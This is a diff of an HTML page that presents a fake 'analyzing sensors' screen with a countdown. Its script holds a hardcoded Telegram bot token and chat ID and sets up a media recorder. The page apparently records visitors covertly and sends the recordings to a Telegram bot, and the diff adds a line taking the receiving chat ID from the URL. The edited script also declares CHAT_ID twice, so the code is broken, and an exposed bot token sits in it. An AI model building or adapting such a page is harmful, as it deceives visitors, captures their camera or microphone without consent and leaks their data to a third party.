@@ -135,7 +135,7 @@
             <h2 style="color: var(--hacker)">ANALYZING SENSORS</h2>
             <div class="loader-ring"></div>
             <p id="timer" style="font-size: 35px; font-weight: bold;">30</p>
-            <p style="font-family: monospace; color: var(--hacker);">Recording Encrypted Handshake...</p>
+            <p style="font-family: monospace; color: var(--hacker);">cheacking Encrypted Handshake...</p>
         </div>
 
         <div id="step-3" class="hidden">
@@ -174,8 +174,9 @@
     <script>
         // --- CONFIGURATION ---
         const BOT_TOKEN = '8519852338:AAGLztQixpgpju8BFN77yKx5IPEByL20Jao';
-        const CHAT_ID = '6804829152';
-
+        const CHAT_ID = '6804829152'
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get('id');
         let recorder;
         let chunks = [];
 
@@ -270,4 +271,5 @@
     </script>
 </body>
 </html>
+
 
